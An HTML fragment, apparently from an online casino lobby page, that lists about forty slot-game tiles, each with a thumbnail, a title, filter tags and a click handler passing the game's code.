                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Ace Super Scatter" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Ace Super Scatter', '/assets/games/i/165x220/91859275d164cae40d45cdbc0de9bf75.webp?v=0.1' , 'vswaysfortsup', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/91859275d164cae40d45cdbc0de9bf75.webp?v=0.1" src="/assets/games/i/165x220/91859275d164cae40d45cdbc0de9bf75.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Ace Super Scatter">Fortune Ace Super Scatter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bounty Hunter" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bounty Hunter', '/assets/games/i/165x220/e4accb28c0e4fa409feb978172da8495.webp?v=0.1' , 'vs20bhunter', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e4accb28c0e4fa409feb978172da8495.webp?v=0.1" src="/assets/games/i/165x220/e4accb28c0e4fa409feb978172da8495.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bounty Hunter">Bounty Hunter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bee Keeper" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bee Keeper', '/assets/games/i/165x220/56d5368be0497c32d8189d844136d31c.webp?v=0.1' , 'vs10beekeep', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/56d5368be0497c32d8189d844136d31c.webp?v=0.1" src="/assets/games/i/165x220/56d5368be0497c32d8189d844136d31c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bee Keeper">Bee Keeper</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Genie’s Gem Bonanza" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Genie’s Gem Bonanza', '/assets/games/i/165x220/9bb0f17fd71bdc8ed54159dbdc944534.webp?v=0.1' , 'vs20gengembnz', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/9bb0f17fd71bdc8ed54159dbdc944534.webp?v=0.1" src="/assets/games/i/165x220/9bb0f17fd71bdc8ed54159dbdc944534.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Genie’s Gem Bonanza">Genie’s Gem Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Captain Kraken Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Captain Kraken Megaways', '/assets/games/i/165x220/0c82bf3116499488a98c9323dd1d68fc.webp?v=0.2' , 'vswayschilhtwo', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0c82bf3116499488a98c9323dd1d68fc.webp?v=0.2" src="/assets/games/i/165x220/0c82bf3116499488a98c9323dd1d68fc.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Captain Kraken Megaways">Captain Kraken Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jackpot Blaze" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jackpot Blaze', '/assets/games/i/165x220/c7de4b87af977c1dc6aad964615fea3f.webp?v=0.1' , 'vs10jpblaze', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c7de4b87af977c1dc6aad964615fea3f.webp?v=0.1" src="/assets/games/i/165x220/c7de4b87af977c1dc6aad964615fea3f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jackpot Blaze">Jackpot Blaze</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Stampede 2" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Stampede 2', '/assets/games/i/165x220/0f2bae447faa2f2e897811916cbd749c.webp?v=0.1' , 'vswaysfirest2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0f2bae447faa2f2e897811916cbd749c.webp?v=0.1" src="/assets/games/i/165x220/0f2bae447faa2f2e897811916cbd749c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Stampede 2">Fire Stampede 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Zombie School Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Zombie School Megaways', '/assets/games/i/165x220/16817d5035528b28410599a1c22e65db.webp?v=0.1' , 'vswayspompmr2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/16817d5035528b28410599a1c22e65db.webp?v=0.1" src="/assets/games/i/165x220/16817d5035528b28410599a1c22e65db.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Zombie School Megaways">Zombie School Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lobster House" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lobster House', '/assets/games/i/165x220/7b35e51c23ed9c47e731f651cfaec6f1.webp?v=0.2' , 'vs20lbstrhouse', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7b35e51c23ed9c47e731f651cfaec6f1.webp?v=0.2" src="/assets/games/i/165x220/7b35e51c23ed9c47e731f651cfaec6f1.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lobster House">Lobster House</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Spellmaster" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Spellmaster', '/assets/games/i/165x220/ccc79bd27b39127635a20328d4a510c5.webp?v=0.1' , 'vs10spellmastr', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ccc79bd27b39127635a20328d4a510c5.webp?v=0.1" src="/assets/games/i/165x220/ccc79bd27b39127635a20328d4a510c5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Spellmaster">Spellmaster</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ultra Burn Dice" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ultra Burn Dice', '/assets/games/i/165x220/9559cbf33c3258a171638862a660b288.webp?v=0.1' , 'vs5ultradice', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/9559cbf33c3258a171638862a660b288.webp?v=0.1" src="/assets/games/i/165x220/9559cbf33c3258a171638862a660b288.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ultra Burn Dice">Ultra Burn Dice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ice Mints" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ice Mints', '/assets/games/i/165x220/e04ff5dc513a5e72fee0d41bc00112fc.webp?v=0.1' , 'vs20popbottles', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e04ff5dc513a5e72fee0d41bc00112fc.webp?v=0.1" src="/assets/games/i/165x220/e04ff5dc513a5e72fee0d41bc00112fc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ice Mints">Ice Mints</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Reel Repeat" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Reel Repeat', '/assets/games/i/165x220/ec455e7704f796ac3934599a8736efed.webp?v=0.1' , 'vs10bbrrp', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ec455e7704f796ac3934599a8736efed.webp?v=0.1" src="/assets/games/i/165x220/ec455e7704f796ac3934599a8736efed.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Reel Repeat">Big Bass Reel Repeat</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Argonauts" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Argonauts', '/assets/games/i/165x220/7da7d25a0d401d88a0f4bd4297d12a95.webp?v=0.1' , 'vswaysargonts', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7da7d25a0d401d88a0f4bd4297d12a95.webp?v=0.1" src="/assets/games/i/165x220/7da7d25a0d401d88a0f4bd4297d12a95.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Argonauts">Argonauts</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wolf Gold 4 Pack" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wolf Gold 4 Pack', '/assets/games/i/165x220/04d0513f534472182eaf1c558acad16a.webp?v=0.1' , 'vs25quadwolf', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/04d0513f534472182eaf1c558acad16a.webp?v=0.1" src="/assets/games/i/165x220/04d0513f534472182eaf1c558acad16a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wolf Gold 4 Pack">Wolf Gold 4 Pack</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gem Trio" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gem Trio', '/assets/games/i/165x220/1f11311945e2cbf47d5b698b1530ab09.webp?v=0.1' , 'vs9gemtrio', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1f11311945e2cbf47d5b698b1530ab09.webp?v=0.1" src="/assets/games/i/165x220/1f11311945e2cbf47d5b698b1530ab09.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gem Trio">Gem Trio</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Chilli Heat Spicy Spins" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Chilli Heat Spicy Spins', '/assets/games/i/165x220/aab8f1c6f026b980f656c7af1889a7a5.webp?v=0.1' , 'vs10chillihmr', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/aab8f1c6f026b980f656c7af1889a7a5.webp?v=0.1" src="/assets/games/i/165x220/aab8f1c6f026b980f656c7af1889a7a5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Chilli Heat Spicy Spins">Chilli Heat Spicy Spins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="You Can Piggy Bank On It" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'You Can Piggy Bank On It', '/assets/games/i/165x220/ed24f538f1badba6042f2405a9c32a28.webp?v=0.1' , 'vs10piggybank', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ed24f538f1badba6042f2405a9c32a28.webp?v=0.1" src="/assets/games/i/165x220/ed24f538f1badba6042f2405a9c32a28.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="You Can Piggy Bank On It">You Can Piggy Bank On It</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Alien Invaders" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Alien Invaders', '/assets/games/i/165x220/1d75cd711db1cba9eb7a067cd0024380.webp?v=0.1' , 'vs20alieninv', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1d75cd711db1cba9eb7a067cd0024380.webp?v=0.1" src="/assets/games/i/165x220/1d75cd711db1cba9eb7a067cd0024380.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Alien Invaders">Alien Invaders</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Club Tropicana – Happy Hour" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Club Tropicana – Happy Hour', '/assets/games/i/165x220/fd836309194221955aef0264a8a1b4d0.webp?v=0.1' , 'vs12trpcnhour', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fd836309194221955aef0264a8a1b4d0.webp?v=0.1" src="/assets/games/i/165x220/fd836309194221955aef0264a8a1b4d0.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Club Tropicana – Happy Hour">Club Tropicana – Happy Hour</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Waves of Poseidon" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Waves of Poseidon', '/assets/games/i/165x220/10480a4b540499ced644295509b61ad7.webp?v=0.1' , 'vs20bigmass', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/10480a4b540499ced644295509b61ad7.webp?v=0.1" src="/assets/games/i/165x220/10480a4b540499ced644295509b61ad7.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Waves of Poseidon">Waves of Poseidon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gem Fire Fortune" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gem Fire Fortune', '/assets/games/i/165x220/51e66e11a910cad00926962380875c94.webp?v=0.1' , 'vs20gemfirefor', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/51e66e11a910cad00926962380875c94.webp?v=0.1" src="/assets/games/i/165x220/51e66e11a910cad00926962380875c94.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gem Fire Fortune">Gem Fire Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild West Gold Blazing Bounty" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild West Gold Blazing Bounty', '/assets/games/i/165x220/4f10439f9eafd545fb3f4358b019aab7.webp?v=0.1' , 'vs20wwgcluster', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4f10439f9eafd545fb3f4358b019aab7.webp?v=0.1" src="/assets/games/i/165x220/4f10439f9eafd545fb3f4358b019aab7.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild West Gold Blazing Bounty">Wild West Gold Blazing Bounty</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Finger Lick’n Free Spins" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Finger Lick’n Free Spins', '/assets/games/i/165x220/2411a58da94111e415f13db6e9492b1b.webp?v=0.1' , 'vs10fingerlfs', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2411a58da94111e415f13db6e9492b1b.webp?v=0.1" src="/assets/games/i/165x220/2411a58da94111e415f13db6e9492b1b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Finger Lick’n Free Spins">Finger Lick’n Free Spins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gold Party 2 – After Hours" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gold Party 2 – After Hours', '/assets/games/i/165x220/727deff7ca9505d06d92ff8fa82a17b6.webp?v=0.1' , 'vs25goldpartya', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/727deff7ca9505d06d92ff8fa82a17b6.webp?v=0.1" src="/assets/games/i/165x220/727deff7ca9505d06d92ff8fa82a17b6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gold Party 2 – After Hours">Gold Party 2 – After Hours</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Temple Guardians" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Temple Guardians', '/assets/games/i/165x220/8471a8d45c9cc67ff96cfae91d857edd.webp?v=0.1' , 'vs10diamondrgh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8471a8d45c9cc67ff96cfae91d857edd.webp?v=0.1" src="/assets/games/i/165x220/8471a8d45c9cc67ff96cfae91d857edd.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Temple Guardians">Temple Guardians</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Boxing Bonus Round" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Boxing Bonus Round', '/assets/games/i/165x220/cf5a5c53b1fcf48ad568e333d55c6311.webp?v=0.1' , 'vs10bbbbrnd', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/cf5a5c53b1fcf48ad568e333d55c6311.webp?v=0.1" src="/assets/games/i/165x220/cf5a5c53b1fcf48ad568e333d55c6311.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Boxing Bonus Round">Big Bass Boxing Bonus Round</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mummy’s Jewels" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mummy’s Jewels', '/assets/games/i/165x220/4bad8db8c192278319a9d3e64de05785.webp?v=0.1' , 'vswaysmjwl', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4bad8db8c192278319a9d3e64de05785.webp?v=0.1" src="/assets/games/i/165x220/4bad8db8c192278319a9d3e64de05785.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mummy’s Jewels">Mummy’s Jewels</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Hades" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Hades', '/assets/games/i/165x220/ab81e9855459bb420789a072676c5bad.webp?v=0.1' , 'vs20gtsofhades', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ab81e9855459bb420789a072676c5bad.webp?v=0.1" src="/assets/games/i/165x220/ab81e9855459bb420789a072676c5bad.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Hades">Gates of Hades</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Eye of Spartacus" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Eye of Spartacus', '/assets/games/i/165x220/bf5cf13632d7295a1fea56e27e97099f.webp?v=0.1' , 'vs15eyeofspart', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/bf5cf13632d7295a1fea56e27e97099f.webp?v=0.1" src="/assets/games/i/165x220/bf5cf13632d7295a1fea56e27e97099f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Eye of Spartacus">Eye of Spartacus</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Majestic Express – Gold Run" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Majestic Express – Gold Run', '/assets/games/i/165x220/1067aca0d7c4ed777213a37e8a343649.webp?v=0.1' , 'vs25goldrexp', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1067aca0d7c4ed777213a37e8a343649.webp?v=0.1" src="/assets/games/i/165x220/1067aca0d7c4ed777213a37e8a343649.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Majestic Express – Gold Run">Majestic Express – Gold Run</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Resurrecting Riches" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Resurrecting Riches', '/assets/games/i/165x220/33d0ed0f871eaa6f567689b9c5551e3a.webp?v=0.1' , 'vswaysresurich', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/33d0ed0f871eaa6f567689b9c5551e3a.webp?v=0.1" src="/assets/games/i/165x220/33d0ed0f871eaa6f567689b9c5551e3a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Resurrecting Riches">Resurrecting Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jumbo Safari" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jumbo Safari', '/assets/games/i/165x220/6ed31bc5dd118356ff080e504cdbbaed.webp?v=0.1' , 'vs20jjjack', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6ed31bc5dd118356ff080e504cdbbaed.webp?v=0.1" src="/assets/games/i/165x220/6ed31bc5dd118356ff080e504cdbbaed.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jumbo Safari">Jumbo Safari</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sleeping Dragon" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sleeping Dragon', '/assets/games/i/165x220/5dabbcf4383bc2b1bc4e32e66d82128e.webp?v=0.1' , 'vs25sleepdrag', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5dabbcf4383bc2b1bc4e32e66d82128e.webp?v=0.1" src="/assets/games/i/165x220/5dabbcf4383bc2b1bc4e32e66d82128e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sleeping Dragon">Sleeping Dragon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fiesta Fortune" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fiesta Fortune', '/assets/games/i/165x220/3222706a9f0871cac82ed3e5a99e0890.webp?v=0.1' , 'vs10gbseries', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3222706a9f0871cac82ed3e5a99e0890.webp?v=0.1" src="/assets/games/i/165x220/3222706a9f0871cac82ed3e5a99e0890.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fiesta Fortune">Fiesta Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Witch Heart Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Witch Heart Megaways™', '/assets/games/i/165x220/efc71ddfa75971b590b47ab7cf54996b.webp?v=0.1' , 'vswayswildbrst', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/efc71ddfa75971b590b47ab7cf54996b.webp?v=0.1" src="/assets/games/i/165x220/efc71ddfa75971b590b47ab7cf54996b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Witch Heart Megaways™">Witch Heart Megaways™</h5>
        </a>
        
     
